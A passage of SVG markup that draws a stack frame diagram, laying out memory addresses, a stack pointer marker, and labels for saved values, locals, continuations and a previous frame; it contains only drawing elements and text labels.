fill="none" stroke="currentcolor"/><path d="M104 472H272" fill="none" stroke="currentcolor"/><path d="M104 520H272" fill="none" stroke="currentcolor"/><path d="M104 568H272" fill="none" stroke="currentcolor"/><path d="M104 616H272" fill="none" stroke="currentcolor"/><path d="M104 0V384" fill="none" stroke="currentcolor"/><path d="M104 384v16" fill="none" stroke="currentcolor"/><path d="M104 4e2V656" fill="none" stroke="currentcolor"/><path d="M272 0V384" fill="none" stroke="currentcolor"/><path d="M272 384v16" fill="none" stroke="currentcolor"/><path d="M272 4e2V656" fill="none" stroke="currentcolor"/><path d="M608 128V272" fill="none" stroke="currentcolor"/><path d="M664 192v80" fill="none" stroke="currentcolor"/><path d="M720 192v80" fill="none" stroke="currentcolor"/><path d="M776 192v80" fill="none" stroke="currentcolor"/><path d="M832 144V272" fill="none" stroke="currentcolor"/><path d="M888 192v80" fill="none" stroke="currentcolor"/><path d="M944 192v80" fill="none" stroke="currentcolor"/><path d="M1e3 192v80" fill="none" stroke="currentcolor"/><path d="M1056 128V272" fill="none" stroke="currentcolor"/><path d="M104 368v8" fill="none" stroke="currentcolor"/><path d="M272 368v8" fill="none" stroke="currentcolor"/><path d="M608 272v8" fill="none" stroke="currentcolor"/><path d="M664 184v8" fill="none" stroke="currentcolor"/><path d="M664 272v8" fill="none" stroke="currentcolor"/><path d="M720 184v8" fill="none" stroke="currentcolor"/><path d="M720 272v8" fill="none" stroke="currentcolor"/><path d="M776 184v8" fill="none" stroke="currentcolor"/><path d="M776 272v8" fill="none" stroke="currentcolor"/><path d="M832 272v8" fill="none" stroke="currentcolor"/><path d="M888 184v8" fill="none" stroke="currentcolor"/><path d="M888 272v8" fill="none" stroke="currentcolor"/><path d="M944 184v8" fill="none" stroke="currentcolor"/><path d="M944 272v8" fill="none" stroke="currentcolor"/><path d="M1e3 184v8" fill="none" stroke="currentcolor"/><path d="M1e3 272v8" fill="none" stroke="currentcolor"/><path d="M1056 272v8" fill="none" stroke="currentcolor"/><text text-anchor="middle" x="0" y="84" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="0" y="132" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="0" y="180" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="0" y="228" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="0" y="276" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="0" y="324" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="0" y="372" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="0" y="468" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="0" y="516" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="0" y="564" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="0" y="612" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="8" y="84" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="8" y="132" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="8" y="180" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="8" y="228" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="8" y="276" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="8" y="324" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="8" y="372" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="8" y="468" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="8" y="516" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="8" y="564" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="8" y="612" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="16" y="84" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="16" y="132" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="16" y="180" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="16" y="228" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="16" y="276" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="16" y="324" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="16" y="372" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="16" y="468" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="16" y="516" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="16" y="564" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="16" y="612" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="24" y="84" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="24" y="132" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="24" y="180" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="24" y="228" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="24" y="276" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="24" y="324" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="24" y="372" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="24" y="468" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="24" y="516" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="24" y="564" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="24" y="612" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="32" y="84" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="32" y="132" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="32" y="180" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="32" y="228" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="32" y="276" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="32" y="324" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="32" y="372" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="32" y="468" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="32" y="516" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="32" y="564" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="32" y="612" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="40" y="84" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="40" y="132" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="40" y="180" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="40" y="228" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="40" y="276" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="40" y="324" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="40" y="372" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="40" y="468" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="40" y="516" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="40" y="564" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="40" y="612" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="48" y="84" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="48" y="132" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="48" y="180" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="48" y="228" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="48" y="276" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="48" y="324" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="48" y="372" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="48" y="468" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="48" y="516" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="48" y="564" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="48" y="612" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="56" y="68" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="56" y="84" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="56" y="132" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="56" y="180" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="56" y="228" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="56" y="276" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="56" y="324" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="56" y="372" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="56" y="468" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="56" y="516" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="56" y="564" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="56" y="612" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="64" y="68" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="64" y="84" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="64" y="132" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="64" y="180" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="64" y="228" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="64" y="276" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="64" y="324" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="64" y="372" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="64" y="468" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="64" y="516" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="64" y="564" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="64" y="612" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="72" y="84" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="72" y="132" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="72" y="180" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="72" y="228" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="72" y="276" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="72" y="324" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="72" y="372" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="72" y="468" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="72" y="516" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="72" y="564" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="72" y="612" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="80" y="68" fill="currentcolor" style="font-size:1em">=</text><text text-anchor="middle" x="80" y="84" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="80" y="132" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="80" y="180" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="80" y="228" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="80" y="276" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="80" y="324" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="80" y="372" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="80" y="468" fill="currentcolor" style="font-size:1em">9</text><text text-anchor="middle" x="80" y="516" fill="currentcolor" style="font-size:1em">9</text><text text-anchor="middle" x="80" y="564" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="80" y="612" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="88" y="68" fill="currentcolor" style="font-size:1em">></text><text text-anchor="middle" x="88" y="84" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="88" y="132" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="88" y="180" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="88" y="228" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="88" y="276" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="88" y="324" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="88" y="372" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="88" y="468" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="88" y="516" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="88" y="564" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="88" y="612" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="120" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="120" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="120" y="164" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="120" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="120" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="120" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="120" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="120" y="404" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="120" y="452" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="120" y="500" fill="currentcolor" style="font-size:1em">?</text><text text-anchor="middle" x="120" y="548" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="120" y="596" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="120" y="644" fill="currentcolor" style="font-size:1em">P</text><text text-anchor="middle" x="128" y="68" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="128" y="116" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="128" y="164" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="128" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="128" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="128" y="308" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="128" y="356" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="128" y="404" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="128" y="452" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="128" y="500" fill="currentcolor" style="font-size:1em">?</text><text text-anchor="middle" x="128" y="548" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="128" y="596" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="128" y="644" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="136" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="136" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="136" y="164" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="136" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="136" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="136" y="308" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="136" y="356" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="136" y="404" fill="currentcolor" style="font-size:1em">k</text><text text-anchor="middle" x="136" y="452" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="136" y="500" fill="currentcolor" style="font-size:1em">?</text><text text-anchor="middle" x="136" y="548" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="136" y="596" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="136" y="644" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="144" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="144" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="144" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="144" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="144" y="404" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="144" y="548" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="144" y="596" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="144" y="644" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="152" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="152" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="152" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="152" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="152" y="404" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="152" y="548" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="152" y="596" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="152" y="644" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="160" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="160" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="160" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="160" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="160" y="404" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="160" y="548" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="160" y="596" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="160" y="644" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="168" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="168" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="168" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="168" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="168" y="548" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="168" y="596" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="168" y="644" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="176" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="176" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="176" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="176" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="176" y="548" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="176" y="644" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="184" y="68" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="184" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="184" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="184" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="184" y="548" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="192" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="192" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="192" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="192" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="192" y="548" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="192" y="644" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="200" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="200" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="200" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="200" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="200" y="548" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="200" y="644" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="208" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="208" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="208" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="208" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="208" y="548" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="208" y="644" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="216" y="68" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="216" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="216" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="216" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="216" y="644" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="224" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="224" y="116" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="224" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="224" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="224" y="644" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="232" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="232" y="116" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="232" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="232" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="240" y="68" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="240" y="116" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="240" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="240" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="248" y="68" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="248" y="116" fill="currentcolor" style="font-size:1em">7</text><text text-anchor="middle" x="248" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="248" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="256" y="68" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="256" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="256" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="256" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="288" y="52" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="288" y="68" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="288" y="100" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="288" y="116" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="288" y="148" fill="currentcolor" style="font-size:1em">L</text><text text-anchor="middle" x="288" y="164" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="288" y="196" fill="currentcolor" style="font-size:1em">L</text><text text-anchor="middle" x="288" y="212" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="288" y="244" fill="currentcolor" style="font-size:1em">C</text><text text-anchor="middle" x="288" y="292" fill="currentcolor" style="font-size:1em">L</text><text text-anchor="middle" x="288" y="308" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="288" y="340" fill="currentcolor" style="font-size:1em">C</text><text text-anchor="middle" x="288" y="436" fill="currentcolor" style="font-size:1em">C</text><text text-anchor="middle" x="288" y="484" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="288" y="532" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="288" y="580" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="296" y="52" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="296" y="68" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="296" y="100" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="296" y="116" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="296" y="148" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="296" y="164" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="296" y="196" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="296" y="212" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="296" y="244" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="296" y="292" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="296" y="308" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="296" y="340" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="296" y="436" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="296" y="484" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="296" y="532" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="296" y="580" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="304" y="52" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="304" y="68" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="304" y="100" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="304" y="116" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="304" y="148" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="304" y="164" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="304" y="196" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="304" y="212" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="304" y="244" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="304" y="292" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="304" y="308" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="304" y="340" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="304" y="436" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="304" y="484" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="304" y="532" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="304" y="580" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="312" y="52" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="312" y="68" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="312" y="100" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="312" y="116" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="312" y="148" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="312" y="164" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="312" y="196" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="312" y="212" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="312" y="244" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="312" y="292" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="312" y="308" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="312" y="340" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="312" y="436" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="312" y="484" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="312" y="532" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="312" y="580" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="320" y="52" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="320" y="68" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="320" y="100" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="320" y="116" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="320" y="148" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="320" y="164" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="320" y="196" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="320" y="244" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="320" y="292" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="320" y="308" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="320" y="340" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="320" y="436" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="320" y="484" fill="currentcolor" style="font-size:1em">k</text><text text-anchor="middle" x="320" y="532" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="320" y="580" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="328" y="68" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="328" y="116" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="328" y="164" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="328" y="212" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="328" y="244" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="328" y="308" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="328" y="340" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="328" y="436" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="336" y="52" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="336" y="68" fill="currentcolor" 